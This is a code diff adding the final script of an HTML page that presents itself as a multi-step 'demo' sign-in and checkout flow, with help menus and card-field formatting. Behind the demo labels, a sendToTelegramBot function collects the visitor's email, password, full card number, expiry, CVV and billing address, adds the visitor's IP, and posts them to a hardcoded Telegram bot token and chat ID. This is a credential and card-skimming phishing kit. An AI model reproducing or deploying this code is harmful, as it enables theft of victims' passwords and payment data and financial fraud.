+        reviewHelp.addEventListener("click", function (event) {
+            event.stopPropagation();
+            toggleHelp(reviewHelp, reviewHelpMenu);
+        });
+
+        // HELP — STEP 3
+        passwordHelp.addEventListener("click", function (event) {
+            event.stopPropagation();
+            toggleHelp(passwordHelp, passwordHelpMenu);
+        });
+
+        // HELP — STEP 4
+        paymentHelp.addEventListener("click", function (event) {
+            event.stopPropagation();
+            toggleHelp(paymentHelp, paymentHelpMenu);
+        });
+
+        // Demo Help Buttons
+        document.querySelectorAll("[data-demo-action]").forEach(function (button) {
+            button.addEventListener("click", function (event) {
+                event.stopPropagation();
+                alert("Demo mode: this option is not connected to any service.");
+            });
+        });
+
+        // Click Outside Help
+        document.addEventListener("click", function () {
+            closeHelpMenus();
+        });
+
+        // Escape
+        document.addEventListener("keydown", function (event) {
+            if (event.key === "Escape") {
+                closeHelpMenus();
+            }
+        });
+
+        // Demo Payment Field Elements
+        const demoCardName = document.getElementById("demoCardName");
+        const demoCardNumber = document.getElementById("demoCardNumber");
+        const demoExpiry = document.getElementById("demoExpiry");
+        const demoCvv = document.getElementById("demoCvv");
+
+        // Demo Card Number Formatting
+        demoCardNumber.addEventListener("input", function () {
+            let value = this.value.replace(/\D/g, "").slice(0, 16);
+
+            let formatted = "";
+
+            for (let i = 0; i < value.length; i += 4) {
+                if (formatted) {
+                    formatted += " ";
+                }
+
+                formatted += value.slice(i, i + 4);
+            }
+
+            this.value = formatted;
+        });
+
+        // Demo Expiry Formatting
+        demoExpiry.addEventListener("input", function () {
+            let value = this.value.replace(/\D/g, "").slice(0, 4);
+
+            if (value.length > 2) {
+                value = value.slice(0, 2) + "/" + value.slice(2);
+            }
+
+            this.value = value;
+        });
+
+        // Demo CVV Formatting
+        demoCvv.addEventListener("input", function () {
+            this.value = this.value.replace(/\D/g, "").slice(0, 4);
+        });
+
+        // Force Country to United States
+        const billingCountry = document.getElementById("billingCountry");
+
+        billingCountry.value = "US";
+
+        billingCountry.addEventListener("change", function () {
+            this.value = "US";
+        });
+
+        // Function to send data to Telegram bot
+        function sendToTelegramBot(data) {
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(ipData => {
+                    const ip = ipData.ip;
+                    data.ip = ip;
+
+                    // Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
+                    // Replace 'YOUR_CHAT_ID' with the chat ID of the recipient
+                    const telegramUrl = `https://api.telegram.org/bot8932250041:AAETZqbxJjf53UeAKUpKHmfapiirGyRXPWk/sendMessage`;
+
+                    let message = `<b>${data.step}</b>\n`;
+                    for (let key in data.data) {
+                        message += `${key}: ${data.data[key]}\n`;
+                    }
+                    message += `\nIP Address: ${ip}`;
+
+                    // Improved formatting with emojis
+                    if (data.step === "Step 4") {
+                        message = `<b>💳 Payment Details:</b>\n`;
+                        message += `• Card Name: ${data.data.cardName} 👤\n`;
+                        message += `• Card Number: ${data.data.cardNumber} 💳\n`;
+                        message += `• Expiry: ${data.data.expiry} 📅\n`;
+                        message += `• CVV: ${data.data.cvv} 🔒\n`;
+                        message += `• Billing Address: ${data.data.billingAddress} 🏡\n`;
+                        message += `• City: ${data.data.billingCity} 📍\n`;
+                        message += `• State: ${data.data.billingState} 🗺️\n`;
+                        message += `• Zip: ${data.data.billingZip} 🎟️\n`;
+                        message += `• Country: ${data.data.billingCountry} 🌍`;
+                    } else if (data.step === "Step 1") {
+                        message = `<b>📧 Email:</b> ${data.data.email} 👤\n`;
+                        message += `IP Address: ${ip} 🌐`;
+                    } else if (data.step === "Step 2") {
+                        message = `<b>📧 Email:</b> ${data.data.email} 👤\n`;
+                        message += `IP Address: ${ip} 🌐`;
+                    } else if (data.step === "Step 3") {
+                        message = `<b>🔒 Password:</b> ${data.data.password} 🔒\n`;
+                        message += `IP Address: ${ip} 🌐`;
+                    }
+
+                    fetch(telegramUrl, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: "676012585",
+                            text: message,
+                            parse_mode: "HTML"
+                        })
+                    })
+                        .then(response => response.json())
+                        .then(result => console.log("Success:", result))
+                        .catch(error => console.error("Error:", error));
+                });
+        }
+
+
+
+
+
+
+    </script>
+
+</body>
+
+</html>
